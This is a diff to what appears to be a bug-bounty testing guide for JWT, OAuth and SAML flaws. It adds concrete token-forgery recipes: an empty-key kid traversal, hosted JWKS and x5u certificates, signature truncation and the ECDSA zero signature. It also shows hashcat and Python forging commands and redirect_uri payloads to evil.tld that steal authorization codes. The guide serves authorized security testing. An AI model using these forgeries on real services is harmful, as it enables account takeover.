@@ -34,15 +34,17 @@ invitation.
 | `alg: none` | header `{"alg":"none","typ":"JWT"}`, empty signature, keep the trailing dot | the API accepts it |
 | HS/RS confusion | change `alg` to `HS256`, sign with the **public key bytes** as the HMAC secret | accepted - server used one verify function for both |
 | weak HMAC secret | crack offline: `hashcat -m 16500 jwt.txt rockyou.txt` | you can mint valid tokens |
-| `kid` path traversal | `"kid":"../../../../dev/null"` and sign with an empty key | accepted |
+| `kid` path traversal | set `alg` to **HS256**, `kid` to `../../../../dev/null`, HMAC-sign with an **empty secret** (a single null byte, `k=AA==`, when your tooling refuses a zero-length key) | accepted |
 | `kid` SQL injection | `"kid":"x' UNION SELECT 'secret"` | accepted, or an error leaks |
-| `jku`/`x5u` injection | point at a JWKS **you host**, sign with your key | accepted - full forgery |
+| `jku` injection | point at a JWK **Set you host** - `{"keys":[{ your public JWK, kid matching the token }]}` served as JSON - and sign with your private key | accepted - full forgery |
+| `x5u` injection | point at a **PEM certificate chain you host**, your self-signed cert first (RFC 7515 §4.1.5 - a JWKS here just fails to parse); mirror its thumbprint into `x5t`/`x5t#S256` if the token carries one | accepted - full forgery |
 | embedded `jwk` | put your own public key in the header | accepted |
 | no signature check | flip one payload byte, keep the old signature | still accepted |
 | expiry ignored | replay a token past `exp` | accepted |
 | claim confusion | change `sub`/`user_id` to B's, or `role` to `admin` | you act as B or admin |
 | `aud`/`iss` unchecked | replay a token minted for a *different* service or tenant | accepted |
-| algorithm downgrade | RS512 -> RS256, or a truncated signature | accepted |
+| signature truncation | cut bytes off the signature, or send a zero-length one | accepted - only the bytes you sent were compared |
+| ECDSA `(r,s)=(0,0)` | `ES256/384/512` only - an all-zero signature (JWS carries raw r‖s, so 64 zero bytes for ES256); CVE-2022-21449 | accepted - the "psychic signature" class |
 
 ```bash
 # alg:none, stdlib only
@@ -60,6 +62,12 @@ msg = bj({"alg":"HS256","typ":"JWT"}) + "." + bj({"sub":"admin","role":"admin","
 print(msg + "." + b(hmac.new(b"secret", msg.encode(), hashlib.sha256).digest()))
 PY
 ```
+
+`RS512 -> RS256` is **not** on the ladder: both are RSA over the same private key, so the swap gains
+you nothing and you cannot mint the token. The only real downgrades are RS/ES -> HS with the public key
+as the HMAC secret, HS512 -> HS256 *once the secret is cracked*, a truncated signature, and the ECDSA
+zero case. For `kid` traversal any file whose bytes you can predict works as the secret - `/dev/null`
+first, then a static asset the app also serves over HTTP, which you can fetch and hash yourself.
 
 `jwt_tool -t "$URL" -rh "Authorization: Bearer $T" -M at` automates the same ladder if
 installed. Verify each accepted token with **one** authenticated request to a
@@ -80,11 +88,11 @@ exchange. The parameters are the attack surface.
 | `redirect_uri` not exact-matched | `…&redirect_uri=https://evil.tld`, `…/legit/../evil`, `…@evil.tld`, `…?x=.target.com`, `…#.target.com`, `//evil.tld`, open-redirect on an allowed host as a hop | authorization code exfiltration -> ATO |
 | `state` missing or unvalidated | drop `state`, or reuse a stale one | CSRF on account linking -> attacker links their identity to the victim's account |
 | PKCE downgrade | drop `code_challenge`, or send `code_verifier` of a different flow | code interception becomes usable |
-| implicit flow enabled | `response_type=token` where `code` is expected | token lands in the URL fragment, leaks via `Referer` and history |
+| implicit flow enabled | `response_type=token` where `code` is expected | the token lands in the URL fragment - history and bfcache, any third-party script reading `location.hash`, and a callback that copies the fragment into a query string or an outbound URL |
 | code reuse | exchange the same `code` twice | broken single-use guarantee |
 | code substitution | exchange a code minted for client X at client Y | cross-client ATO |
 | scope escalation | add `scope=admin openid email` | over-privileged token |
-| `response_mode=form_post` juggling | change delivery so the code lands somewhere logged | leak |
+| `response_mode` downgrade | client expects `form_post` (code in a POST body - the safe baseline); send `response_mode=query`, or `fragment` | the code moves into the URL: access logs, history, `Referer` (query case), hash-reading scripts (fragment case) |
 | `nonce` unchecked (OIDC) | replay an `id_token` | replay ATO |
 | `id_token` signature unchecked | forge one (see the JWT ladder) | full ATO |
 | email-claim trust | register `victim@…` at an IdP that does not verify email, then SSO in | **pre-account-takeover** |
@@ -167,7 +175,9 @@ SAML: signature not verified · XML signature wrapping · comment truncation in 
 - **Brute-forcing OTPs on a live target** without checking whether the program forbids it. Usually it does.
 - **Reporting a decoded JWT as a finding.** JWTs are *designed* to be readable. The flaw is in verification.
 - **Claiming ATO without performing it** against your own second account. Show both sides.
-- **Missing the `Referer` leak** of a fragment token.
+- **Mis-stating how a fragment token leaks.** A browser never puts the fragment in `Referer`
+  (RFC 7231 §5.5.2) - the paths are history and bfcache, a script reading `location.hash`, and a
+  callback that copies the fragment into a query parameter. `Referer` is the *query*-delivered case.
 - **Leaking a real authorization code** to a third-party server you do not control while testing `redirect_uri`. Use a host you own.
 - **Reporting "no PKCE"** on a confidential server-side client where it is not required. Know the flow type.
 - **Forgetting to check session invalidation** after the password change you just demonstrated.
